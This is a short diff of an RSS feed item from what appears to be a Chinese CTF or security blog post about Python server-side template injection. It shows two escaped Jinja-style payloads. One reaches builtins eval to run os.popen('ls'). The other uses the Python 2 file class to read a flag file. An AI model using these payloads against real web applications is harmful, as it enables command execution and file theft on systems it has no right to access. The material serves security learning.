@@ -81,7 +81,7 @@ os.popen () 方法用于从一个命令打开一个管道。&lt;/p&gt;
 (1) 先用脚本找包含 builtins 的类：128,129,130…&lt;br&gt;
 &lt;mark&gt;python3&lt;/mark&gt;&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;().__class__.__base__.__subclasses__()[128].__init__.__globals__[&amp;#x27;__builtins__&amp;#x27;][&amp;#x27;eval&amp;#x27;](&amp;quot;__import__(&amp;#x27;os&amp;#x27;).popen(&amp;#x27;ls&amp;#x27;).read()&amp;quot;)&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python2,有file类&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;[].__class__.__bases__[0].__subclasses__()[40](&amp;#x27;flag&amp;#x27;).read()&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;2. 过滤了&lt;/p&gt;
+&lt;p&gt;2. 过滤了 ``&lt;/p&gt;
  ]]></description>
         </item>
         <item>
